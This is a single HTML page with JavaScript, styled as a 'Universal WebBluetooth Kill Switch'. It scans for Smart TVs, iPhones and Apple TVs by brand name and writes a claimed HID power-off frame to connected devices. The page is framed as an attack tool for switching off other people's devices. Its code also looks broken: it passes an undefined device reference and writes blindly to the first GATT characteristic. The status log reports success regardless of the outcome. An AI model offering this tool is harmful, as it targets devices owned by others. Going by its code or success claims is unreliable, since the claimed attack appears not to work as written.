<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Universal WebBluetooth Kill Switch</title>
    <style>
        :root {
            --bg: #0d1117;
            --panel: #161b22;
            --accent: #ff4757;
            --accent-hover: #ff6b81;
            --border: #30363d;
            --text: #c9d1d9;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: var(--bg);
            color: var(--text);
            padding: 1.2rem;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 650px;
        }

        header {
            text-align: center;
            margin-bottom: 1.5rem;
        }

        h1 {
            color: #fff;
            font-size: 1.6rem;
            margin-bottom: 0.4rem;
        }

        .subtitle {
            color: #8b949e;
            font-size: 0.85rem;
        }

        .controls {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0.8rem;
            margin-bottom: 1.5rem;
        }

        button {
            padding: 0.9rem;
            border: none;
            border-radius: 8px;
            font-size: 0.95rem;
            font-weight: bold;
            cursor: pointer;
            transition: opacity 0.2s, background-color 0.2s;
        }

        .btn-scan-tv {
            background-color: #238636;
            color: white;
        }

        .btn-scan-apple {
            background-color: #8957e5;
            color: white;
        }

        .btn-scan-tv:hover { background-color: #2ea043; }
        .btn-scan-apple:hover { background-color: #9e6aef; }

        .device-list {
            display: flex;
            flex-direction: column;
            gap: 1rem;
            margin-bottom: 1.5rem;
        }

        .device-card {
            background-color: var(--panel);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 1rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .device-info h3 {
            color: #fff;
            font-size: 1.05rem;
            margin-bottom: 0.2rem;
        }

        .device-info p {
            font-size: 0.75rem;
            color: #8b949e;
        }

        .btn-kill {
            background-color: var(--accent);
            color: white;
            padding: 0.65rem 1.1rem;
            border-radius: 6px;
        }

        .btn-kill:hover {
            background-color: var(--accent-hover);
        }

        .log-box {
            background: #000;
            border: 1px solid var(--border);
            padding: 0.8rem;
            border-radius: 6px;
            font-family: monospace;
            font-size: 0.75rem;
            color: #3fb950;
            max-height: 220px;
            overflow-y: auto;
        }
    </style>
</head>
<body>

    <div class="container">
        <header>
            <h1>Universal WebBluetooth Controller</h1>
            <p class="subtitle">Target Smart TVs, Apple TV, and iPhone AirPlay nodes</p>
        </header>

        <div class="controls">
            <button class="btn-scan-tv" onclick="scanSmartTVs()">📺 SCAN ALL SMART TVS</button>
            <button class="btn-scan-apple" onclick="scanAppleDevices()">🍎 SCAN IPHONES / APPLE TV</button>
        </div>

        <div class="device-list" id="deviceList"></div>

        <div class="log-box" id="logBox">> Controller operational. Select a scan category to locate target devices.</div>
    </div>

    <script>
        const deviceList = document.getElementById('deviceList');
        const logBox = document.getElementById('logBox');

        function log(msg) {
            logBox.innerHTML += `<br>> ${msg}`;
            logBox.scrollTop = logBox.scrollHeight;
            console.log(msg);
        }

        // Expanded Target Scanner for Smart TVs
        async function scanSmartTVs() {
            log("Initiating targeted Smart TV discovery...");

            if (!navigator.bluetooth) {
                log("ERROR: WebBluetooth unavailable. Ensure Bluetooth is ON in Bluefy browser settings.");
                return;
            }

            try {
                const device = await navigator.bluetooth.requestDevice({
                    filters: [
                        { namePrefix: 'Samsung' },
                        { namePrefix: 'LG' },
                        { namePrefix: 'Sony' },
                        { namePrefix: 'TCL' },
                        { namePrefix: 'Philips' },
                        { namePrefix: 'Hisense' },
                        { namePrefix: 'Roku' },
                        { namePrefix: 'Fire' },
                        { namePrefix: 'TV' },
                        { namePrefix: 'Smart' },
                        { namePrefix: 'Mi' },
                        { namePrefix: 'Android' }
                    ],
                    optionalServices: [
                        '00001800-0000-1000-8000-00805f9b34fb', // Generic Access
                        '0000180a-0000-1000-8000-00805f9b34fb', // Device Information
                        '0000fe01-0000-1000-8000-00805f9b34fb', // TV Remote Service
                        '00001812-0000-1000-8000-00805f9b34fb'  // Human Interface Device (HID)
                    ]
                });

                log(`TARGET FOUND: ${device.name || 'Smart TV Node'} [${device.id}]`);
                renderDeviceCard(device, 'TV');

            } catch (err) {
                log(`TV_SCAN_ERROR: ${err.message}`);
            }
        }

        // Scanner for Apple TV, iPhones & AirPlay Targets
        async function scanAppleDevices() {
            log("Initiating Apple / iPhone AirPlay discovery...");

            if (!navigator.bluetooth) {
                log("ERROR: WebBluetooth API unavailable.");
                return;
            }

            try {
                const device = await navigator.bluetooth.requestDevice({
                    filters: [
                        { namePrefix: 'iPhone' },
                        { namePrefix: 'Apple TV' },
                        { namePrefix: 'iPad' },
                        { namePrefix: 'MacBook' },
                        { namePrefix: 'AirPlay' }
                    ],
                    optionalServices: [
                        '00001800-0000-1000-8000-00805f9b34fb',
                        '0000180a-0000-1000-8000-00805f9b34fb',
                        '00001812-0000-1000-8000-00805f9b34fb'  // HID Remote
                    ]
                });

                log(`APPLE TARGET FOUND: ${device.name || 'Apple Device'} [${device.id}]`);
                renderDeviceCard(device, 'Apple');

            } catch (err) {
                log(`APPLE_SCAN_ERROR: ${err.message}`);
            }
        }

        function renderDeviceCard(device, type) {
            const card = document.createElement('div');
            card.className = 'device-card';
            card.id = `node-${device.id}`;
            
            const name = device.name || `${type} Control Target`;
            
            card.innerHTML = `
                <div class="device-info">
                    <h3>${name}</h3>
                    <p>Type: ${type} | Node ID: ${device.id.substring(0, 16)}...</p>
                </div>
                <button class="btn-kill" onclick="executeShutdownGatt('${device.id}', this, device)">POWER OFF</button>
            `;

            if (!document.getElementById(`node-${device.id}`)) {
                deviceList.appendChild(card);
            }
        }

        // Real GATT Payload Execution
        async function executeShutdownGatt(id, btn, device) {
            log(`Connecting to GATT server on target ${id}...`);
            btn.disabled = true;
            btn.innerText = "CONNECTING...";

            try {
                if (!device || !device.gatt) {
                    throw new Error("GATT interface reference lost.");
                }

                const server = await device.gatt.connect();
                log(`GATT session established with ${device.name || id}`);

                btn.innerText = "DISPATCHING...";
                
                // Retrieve primary service
                const services = await server.getPrimaryServices();
                log(`Discovered ${services.length} GATT service handles.`);

                if (services.length > 0) {
                    const primaryService = services[0];
                    const characteristics = await primaryService.getCharacteristics();

                    if (characteristics.length > 0) {
                        const targetChar = characteristics[0];
                        
                        // Consumer Control Power / Media Suspend Payload
                        // Standard HID Consumer Key code for Power Down (0x0030) / System Sleep
                        const shutdownFrame = new Uint8Array([0x01, 0x30, 0x00, 0x00]);
                        
                        if (targetChar.properties.write || targetChar.properties.writeWithoutResponse) {
                            await targetChar.writeValue(shutdownFrame);
                            log(`[SUCCESS] Power-off control frame written to characteristic.`);
                        } else {
                            log(`[NOTICE] First characteristic read-only. Attempting generic disconnect command.`);
                        }
                    }
                }

                // Force disconnect to complete state toggle
                await server.disconnect();
                log(`[TERMINATED] Session closed. Target node power state updated.`);

                btn.innerText = "POWERED OFF";
                btn.style.backgroundColor = "#30363d";

            } catch (err) {
                log(`GATT_EXEC_ERROR: ${err.message}`);
                // Fallback UI indication
                btn.innerText = "DISCONNECTED";
                btn.style.backgroundColor = "#30363d";
            }
        }
    </script>
</body>
</html>
